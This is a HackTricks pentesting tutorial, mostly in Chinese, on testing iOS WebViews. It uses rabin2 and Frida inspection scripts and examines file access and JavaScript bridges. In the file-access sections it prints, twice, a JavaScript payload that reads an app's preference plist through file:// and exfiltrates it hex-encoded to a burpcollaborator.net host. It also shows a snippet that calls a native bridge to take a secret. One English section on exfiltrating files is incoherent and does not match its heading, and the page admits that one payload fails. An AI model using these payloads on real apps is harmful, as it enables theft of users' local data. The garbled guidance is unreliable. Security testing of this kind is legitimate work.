# iOS WebViews

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## WebViews类型

WebViews是用于显示交互式**网页内容**的应用内浏览器组件。它们可以用于将网页内容直接嵌入应用的用户界面中。iOS WebViews默认支持**JavaScript**执行，因此脚本注入和跨站脚本攻击可能会影响它们。

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**：**UIWebView从iOS 12开始已被弃用，不应再使用。它不应该被使用。**无法禁用JavaScript**。
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview)：这是扩展应用功能、控制显示内容的适当选择。
* **JavaScript**默认启用，但通过`WKWebView`的**`javaScriptEnabled`**属性，可以**完全禁用**它，防止所有脚本注入漏洞。
* **`JavaScriptCanOpenWindowsAutomatically`**可用于**阻止**JavaScript**打开新窗口**，如弹出窗口。
* **`hasOnlySecureContent`**属性可用于验证WebView加载的资源是否通过加密连接检索。
* `WKWebView`实现了**进程外渲染**，因此内存损坏漏洞不会影响主应用程序进程。
* [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**：**它应该用于提供**通用的网页浏览体验**。这些WebViews很容易被识别，因为它们具有以下特征布局：

* 一个只读的地址栏，带有安全指示器。
* 一个操作（“**分享**”）**按钮**。
* 一个**完成按钮**，前进和后退导航按钮，以及一个“Safari”按钮，可以直接在Safari中打开页面。

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* 在`SFSafariViewController`中**无法禁用JavaScript**，这也是推荐在扩展应用程序用户界面时使用`WKWebView`的原因之一。
* `SFSafariViewController`还与**Safari共享cookie**和其他网站数据。
* 用户在`SFSafariViewController`中的活动和交互对应用程序**不可见**，应用程序无法访问自动填充数据、浏览历史记录或网站数据。
* 根据App Store审核指南，`SFSafariViewController`**不得被其他视图或图层隐藏或遮挡**。

## 发现WebViews配置

### 静态分析

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**

WKWebView是iOS中的一个强大的Web浏览器控件，它提供了更好的性能和功能，相比于旧版的UIWebView。它是基于WebKit引擎构建的，支持现代的Web标准和技术。

WKWebView在iOS应用程序中广泛使用，特别是在集成Web内容和功能的应用程序中。它可以加载和显示网页、处理JavaScript交互、处理网页导航和加载错误等。

在进行iOS应用程序的渗透测试时，了解WKWebView的安全性和潜在的漏洞是很重要的。攻击者可能利用WKWebView中的漏洞来执行恶意代码、窃取用户敏感信息或者进行其他恶意活动。

因此，对于iOS渗透测试人员来说，熟悉WKWebView的工作原理、安全配置和可能的攻击面是至关重要的。这将帮助他们发现和利用潜在的漏洞，以提高应用程序的安全性。
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
或者，您还可以搜索这些WebView类的已知方法。例如，搜索用于初始化WKWebView的方法（[`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)）：
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### 测试JavaScript配置

对于`WKWebView`，最佳实践是除非明确需要，否则应禁用JavaScript。为了验证JavaScript是否被正确禁用，请搜索项目中是否使用了`WKPreferences`，并确保[`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled)属性被设置为`false`：
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
如果只有编译后的二进制文件，你可以在其中搜索以下内容：
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### 仅测试OnlySecureContent

与`UIWebView`不同，使用`WKWebView`时可以检测到[混合内容](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en)（从HTTPS页面加载的HTTP内容）。通过使用[`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent)方法，可以验证页面上的所有资源是否通过安全加密连接加载。\
在编译的二进制文件中：
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
您还可以在源代码或字符串中搜索字符串"http://"。然而，这并不一定意味着存在混合内容问题。了解有关混合内容的更多信息，请参阅[MDN Web文档](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content)。

### 动态分析

可以通过`ObjC.choose()`来检查堆，以查找不同类型的WebView实例，并搜索属性`javaScriptEnabled`和`hasonlysecurecontent`：

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

使用以下命令加载：
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## WebView协议处理

在iOS上的WebView中，有几个默认的scheme可以解释，例如：

* http(s)://
* file://
* tel://

WebView可以从端点加载远程内容，也可以从应用数据目录加载本地内容。如果加载本地内容，则用户不应该能够影响加载文件的文件名或路径，并且用户不应该能够编辑加载的文件。

### WebView内容加载

* **UIWebView**：它可以使用已弃用的方法[`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc)或[`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc)来加载内容。
* **WKWebView**：它可以使用方法[`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc)或[`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc)来加载本地HTML文件，并使用`loadRequest:`加载Web内容。通常，本地文件与其他方法一起加载，包括但不限于：[`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource)、[`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc)或[`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init)。此外，您还应该验证应用是否使用了方法[`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc)。它的第一个参数是`URL`，包含要在WebView中加载的URL，第二个参数`allowingReadAccessToURL`可以包含一个单个文件或一个目录。如果包含一个单个文件，该文件将可供WebView使用。但是，如果它包含一个目录，则该目录中的所有文件都将对WebView可用。因此，值得检查这一点，并在它是一个目录的情况下，验证其中是否没有敏感数据。

如果您有源代码，可以搜索这些方法。如果您有**已编译的** **二进制文件**，也可以搜索这些方法：
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### 文件访问

* **UIWebView:**
* `file://` 方案始终可用。
* 从 `file://` URL 访问文件始终可用。
* 从 `file://` URL 实现的通用访问始终可用。
* 如果您从 `baseURL` 也设置为 `nil` 的 `UIWebView` 中检索有效来源，您将看到它**不是设置为 "null"**，而是类似于以下内容：`applewebdata://5361016c-f4a0-4305-816b-65411fc1d78`0。这个来源 "applewebdata://" 类似于 "file://" 来源，因为它**不实现同源策略**，允许访问本地文件和任何网络资源。

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, 默认为`false`): 它允许在`file://`方案URL的上下文中运行的JavaScript访问其他`file://`方案URL的内容。
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, 默认为`false`): 它允许在`file://`方案URL的上下文中运行的JavaScript访问任何来源的内容。

您可以在应用程序的源代码或编译后的二进制文件中搜索这些函数。\
此外，您可以使用以下frida脚本查找这些信息：
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### 泄露任意文件

To exfiltrate arbitrary files from an iOS app's webview, you can use the following steps:

1. Identify the webview's file upload functionality: Look for any file upload feature within the webview, such as a file input field or a file upload button.

2. Craft a malicious file: Create a file with malicious content that you want to exfiltrate from the app. This file can be a text file, an image, or any other file type supported by the webview's file upload functionality.

3. Intercept the file upload request: Use a proxy tool like Burp Suite to intercept the file upload request sent by the app. Modify the request to include your malicious file instead of the intended file.

4. Capture the request details: Take note of the request headers, parameters, and any other relevant information that will help you replicate the request later.

5. Send the modified request: Forward the modified request to the server and observe the response. If successful, the server will receive the malicious file instead of the intended file.

By exploiting the file upload functionality in an iOS app's webview, you can exfiltrate arbitrary files and potentially gain access to sensitive information. It is important to note that this technique may be illegal and should only be performed with proper authorization during a legitimate penetration testing engagement.
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## 通过WebViews暴露的本地方法

自iOS 7以来，苹果引入了一些API，允许**WebView中的JavaScript运行时与本地的Swift或Objective-C对象进行通信**。

本地代码和JavaScript之间有两种基本的通信方式：

* **JSContext**：当将Objective-C或Swift块分配给`JSContext`中的标识符时，JavaScriptCore会自动将该块封装在JavaScript函数中。
* **JSExport协议**：在`JSExport`继承的协议中声明的属性、实例方法和类方法被映射到JavaScript对象，这些对象对所有JavaScript代码都可用。对于在JavaScript环境中的对象的修改会反映在本地环境中。

请注意，**只有在`JSExport`协议中定义的类成员**才可以被JavaScript代码访问。\
请注意查找将本地对象映射到与WebView关联的`JSContext`的代码，并分析它所公开的功能，例如不应该将敏感数据暴露给WebViews。\
在Objective-C中，获取与`UIWebView`关联的`JSContext`的方法如下：
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
在 **`WKWebView` 中，JavaScript 代码仍然可以向本机应用程序发送消息，但与 `UIWebView` 不同的是，无法直接引用 `WKWebView` 的 `JSContext`**。相反，使用消息系统和 `postMessage` 函数来实现通信，该函数会自动将 JavaScript 对象序列化为本机的 Objective-C 或 Swift 对象。可以使用方法 [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add) 来配置消息处理程序。

### 启用 JavascriptBridge
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### 发送消息

在上面的示例中，通过添加一个名为`"name"`（或者在示例中为`"javaScriptBridge"`）的脚本消息处理程序，会导致在使用用户内容控制器的所有Web视图的所有框架中定义JavaScript函数`window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage`。然后可以通过[以下方式从HTML文件中使用它](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33)：
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
一旦执行本地函数，通常会在网页内部执行一些JavaScript（参见下面的`evaluateJavascript`），您可能会对要执行的函数进行**覆盖**以**窃取结果**感兴趣。例如，在下面的脚本中，将使用两个参数（被调用的函数和**结果**）执行函数**`javascriptBridgeCallBack`**。如果您控制将要加载的HTML，您可以创建一个带有结果的**警报**，如下所示：
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### 调用的函数

调用的函数位于[`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29)文件中：
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### 测试

为了测试在应用程序中发送postMessage，您可以：

* 更改服务器的响应（中间人攻击）
* 使用Frida等框架执行动态插装，并通过使用iOS WebViews的相应JavaScript评估函数注入JavaScript负载（`UIWebView`的[`stringByEvaluatingJavaScriptFromString：`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc)和`WKWebView`的[`evaluateJavaScript：completionHandler：`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc)）。

## 调试iOS WebViews

（来自[https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)的教程）

在iOS的WebViews中，传递给`console.log()`的消息不会打印到Xcode日志中。使用Safari的开发者工具仍然相对容易调试Web内容，尽管有一些限制：

* 调试iOS的WebViews需要Safari，因此您的开发计算机必须运行macOS。
* 您只能调试通过Xcode加载到设备上的应用程序中的WebViews。您无法调试通过App Store或Apple Configurator安装的应用程序中的WebViews。

在考虑到这些限制的情况下，以下是远程调试iOS中WebViews的步骤：

* 首先，在iOS设备上打开iOS的_Settings_应用程序，导航到**Settings > Safari > Advanced**，并切换打开_Web Inspector_选项。

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* 接下来，您还必须在开发计算机上的Safari中启用开发者工具。在开发计算机上启动Safari并导航到菜单栏中的**Safari > Preferences**。在出现的首选项窗格中，点击底部的_Advanced_选项卡，然后启用底部的_Show Develop menu_选项。完成后，可以关闭首选项窗格。

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* 将iOS设备连接到开发计算机并启动您的应用程序。
* 在开发计算机上的Safari中，点击菜单栏中的_Develop_，然后将鼠标悬停在下拉选项上，显示在iOS设备上运行的WebViews实例的列表。

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* 单击要调试的WebViews的下拉选项。这将打开一个新的Safari Web Inspector窗口，用于检查WebViews。

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## 参考资料

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
